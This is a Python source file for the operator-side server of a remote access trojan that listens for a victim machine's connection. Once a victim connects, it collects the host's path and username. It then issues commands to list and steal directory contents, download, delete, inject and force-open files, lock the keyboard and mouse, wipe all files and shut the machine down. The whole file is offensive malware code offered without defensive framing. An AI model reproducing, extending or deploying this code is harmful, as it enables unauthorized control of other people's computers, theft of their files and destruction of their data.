import os
import socket
import sys
import time


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "0.0.0.0"
port = 5219
s.bind((host, port))
print("")
print("Server is @", host)
print("Listening...")
print("")

s.listen(1)

conn, addr = s.accept()
print("")
print("Connection received from:", addr)

print("* Host Information *")
print("-------------------------")
print("System Path:", conn.recv(1024).decode()) # helps for identifying how the path looks like, whether mac or windows
print("Username:", conn.recv(1024).decode()) # may be root or the username of the person
print("-------------------------")
lock_engaged = False


while True:
    try:
        command = input(str(">> "))
        if command == "view_cwd": # view the current directory the file is in

            conn.send(command.encode())
            print("Command sent...")
            print("")
            print("Grabbing Current Directory...")
            files = conn.recv(5000)
            files = files.decode()
            print("")
            #time.sleep(2)
            print("Directory Found : ", files)
        

        elif command == "custom_dir": # view a directory of your choice
            conn.send(command.encode())
            print("")
            cmd_input = input(str("Custom Directory: "))
            conn.send(cmd_input.encode())
            print("Stealing...")
            print("")
            files = conn.recv(5000)
            files = files.decode()
            #time.sleep(2)
            print("Directory Found : ", files)


        elif command == "download_file": # to download file from host
            conn.send(command.encode())
            file_path = input(str("Enter Filepath : "))
            conn.send(file_path.encode())
            new_file = input(str("Enter a Filepath for remote download file : "))
            filename = input(str('Enter your filename: '))
            print("<<Downloading>>")
            with open(os.path.join(new_file, filename), 'wb') as file_to_write:
                while True:
                    data = conn.recv(10000)
                    if not data:
                        break
                    file_to_write.write(data)
                file_to_write.close()
            #time.sleep(3)
            print("Remote Download Complete.")


        elif command == "delete_file": #to delete a file from host
            conn.send(command.encode())
            filepath = input(str("Enter Filepath for remote deletion : "))
            conn.send(filepath.encode())
            #time.sleep(1)
            print("<<Deletion Process Engaged>>")
            #time.sleep(4)
            print("Attack Successful, File Deleted.")


        elif command == "send_file": # to send a file to host
            print("<<Sending>>")
            conn.send(command.encode())
            file_path = input(str("Enter your files path: "))
            dir_path = input(str("Enter directory for remote injection: "))
            print('<<Injecting>>')
            conn.send(dir_path.encode())
            file_name = input(str("Enter a filename: "))
            conn.send(file_name.encode())
            with open(file_path, 'rb') as file_to_send:
                for data in file_to_send:
                    s.sendall(data)
            print("File sent.")


        elif command == "open_file": # to forcefully open a file
            conn.send(command.encode())
            filepath = input(str("Which file to run on slave: "))
            print("<< Sending Command >>")
            conn.send(filepath.encode())
            print("File forced open.")

        elif command == "lock_all":
            if lock_engaged == True:
                print("Keyboard and mouse already supressed. Command Failed")
            else:
                conn.send(command.encode())
                print("Command sent, keyboard and mouse locked.")

        elif command == "unlock_all":
            if lock_engaged == False:
                print("The keyboard and mouse are not being supressed, command failed.")
            
            else:
                conn.send(command.encode())
                print("Command sent, keyboard and Mouse unsupressed")

        elif command ==  "delete_all_files":
            conn.send(command.encode())
            print("All possible files shall be deleted inlcuding this current file")

        elif command.lower() == "self-destruct": #for shutting the computer off
                                                #sometimes doesn't work due to not being root
            conn.send(command.encode())
            time.sleep(2)
            print("<< Goodbye >>")
            time.sleep(0.2)
            print("Connection lost.")
            sys.exit()       

        else: #incase of incorrect command
            #and so it doesn't cut the connection
            print("")
            print("Command failed, check spelling")
    except:
        pass